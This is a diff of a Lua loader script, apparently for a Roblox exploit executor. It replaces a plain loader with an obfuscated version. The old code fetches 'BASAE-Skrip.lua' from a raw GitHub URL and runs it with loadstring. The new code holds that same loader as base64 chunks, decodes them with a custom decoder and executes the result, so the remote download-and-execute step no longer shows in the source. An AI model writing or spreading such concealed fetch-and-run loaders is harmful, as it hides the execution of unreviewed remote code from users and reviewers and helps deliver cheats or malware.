@@ -1,49 +1,55 @@
-local url = "https://raw.githubusercontent.com/mnbvcxz24/BASAE-0xMoldy/main/BASAE-Skrip.lua"
+local encoded = table.concat({
+    "bG9jYWwgdXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9tbmJ2Y3h6MjQvQkFTQUUtMHhNb2xkeS9tYWlu",
+    "L0JBU0FFLVNrcmlwLmx1YSIKCmlmIHR5cGUobG9hZHN0cmluZykgfj0gImZ1bmN0aW9uIiB0aGVuCiAgICB3YXJuKCJbQkFTQUUt",
+    "U2tyaXBdIGxvYWRzdHJpbmcgaXMgdW5hdmFpbGFibGUiKQogICAgcmV0dXJuCmVuZAoKaWYgdHlwZShnYW1lLkh0dHBHZXQpIH49",
+    "ICJmdW5jdGlvbiIgdGhlbgogICAgd2FybigiW0JBU0FFLVNrcmlwXSBIdHRwR2V0IGlzIHVuYXZhaWxhYmxlIikKICAgIHJldHVy",
+    "bgplbmQKCmxvY2FsIG9rLCBzb3VyY2UgPSBwY2FsbChmdW5jdGlvbigpCiAgICByZXR1cm4gZ2FtZTpIdHRwR2V0KHVybCkKZW5k",
+    "KQoKaWYgbm90IG9rIHRoZW4KICAgIHdhcm4oIltCQVNBRS1Ta3JpcF0gRG93bmxvYWQgZmFpbGVkOiAiIC4uIHRvc3RyaW5nKHNv",
+    "dXJjZSkpCiAgICByZXR1cm4KZW5kCgppZiB0eXBlKHNvdXJjZSkgfj0gInN0cmluZyIgdGhlbgogICAgd2FybigiW0JBU0FFLVNr",
+    "cmlwXSBEb3dubG9hZGVkIHNvdXJjZSBpcyBub3QgYSBzdHJpbmc6ICIgLi4gdHlwZW9mKHNvdXJjZSkpCiAgICByZXR1cm4KZW5k",
+    "CgppZiAjc291cmNlID09IDAgdGhlbgogICAgd2FybigiW0JBU0FFLVNrcmlwXSBEb3dubG9hZGVkIHNvdXJjZSBpcyBlbXB0eSIp",
+    "CiAgICByZXR1cm4KZW5kCgpsb2NhbCBjb21waWxlciA9IGxvYWRzdHJpbmcKaWYgdHlwZShjb21waWxlcikgfj0gImZ1bmN0aW9u",
+    "IiB0aGVuCiAgICB3YXJuKCJbQkFTQUUtU2tyaXBdIGxvYWRzdHJpbmcgaXMgdW5hdmFpbGFibGUiKQogICAgcmV0dXJuCmVuZAoK",
+    "bG9jYWwgc2NyaXB0RnVuY3Rpb24sIGNvbXBpbGVFcnJvciA9IGNvbXBpbGVyKHNvdXJjZSkKCmlmIHR5cGUoc2NyaXB0RnVuY3Rp",
+    "b24pIH49ICJmdW5jdGlvbiIgdGhlbgogICAgd2FybigiW0JBU0FFLVNrcmlwXSBDb21waWxlIGZhaWxlZDogIiAuLiB0b3N0cmlu",
+    "Zyhjb21waWxlRXJyb3IpKQogICAgcmV0dXJuCmVuZAoKbG9jYWwgcnVuT2ssIGVyciA9IHBjYWxsKHNjcmlwdEZ1bmN0aW9uKQoK",
+    "aWYgbm90IHJ1bk9rIHRoZW4KICAgIHdhcm4oIltCQVNBRS1Ta3JpcF0gUnVudGltZSBlcnJvcjogIiAuLiB0b3N0cmluZyhlcnIp",
+    "KQplbmQK",
+}, "")
 
-if type(loadstring) ~= "function" then
-    warn("[BASAE-Skrip] loadstring is unavailable")
-    return
+local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+local lookup = {}
+for i = 1, #alphabet do
+    lookup[string.sub(alphabet, i, i)] = i - 1
 end
 
-if type(game.HttpGet) ~= "function" then
-    warn("[BASAE-Skrip] HttpGet is unavailable")
-    return
+local output = {}
+local buffer = 0
+local bits = 0
+
+for i = 1, #encoded do
+    local char = string.sub(encoded, i, i)
+    if char ~= "=" then
+        buffer = buffer * 64 + lookup[char]
+        bits = bits + 6
+        if bits >= 8 then
+            bits = bits - 8
+            local byte = math.floor(buffer / (2 ^ bits)) % 256
+            output[#output + 1] = string.char(byte)
+            buffer = buffer % (2 ^ bits)
+        end
+    end
 end
 
-local ok, source = pcall(function()
-    return game:HttpGet(url)
-end)
-
-if not ok then
-    warn("[BASAE-Skrip] Download failed: " .. tostring(source))
-    return
-end
-
-if type(source) ~= "string" then
-    warn("[BASAE-Skrip] Downloaded source is not a string: " .. typeof(source))
-    return
-end
-
-if #source == 0 then
-    warn("[BASAE-Skrip] Downloaded source is empty")
-    return
-end
-
-local compiler = loadstring
+local source = table.concat(output)
+local compiler = loadstring or load
 if type(compiler) ~= "function" then
-    warn("[BASAE-Skrip] loadstring is unavailable")
-    return
+    error("[BASAE-Skrip] loadstring is unavailable")
 end
 
-local scriptFunction, compileError = compiler(source)
-
-if type(scriptFunction) ~= "function" then
-    warn("[BASAE-Skrip] Compile failed: " .. tostring(compileError))
-    return
+local fn, compileError = compiler(source)
+if type(fn) ~= "function" then
+    error("[BASAE-Skrip] Obfuscated loader compile failed: " .. tostring(compileError))
 end
 
-local runOk, err = pcall(scriptFunction)
-
-if not runOk then
-    warn("[BASAE-Skrip] Runtime error: " .. tostring(err))
-end
+return fn()
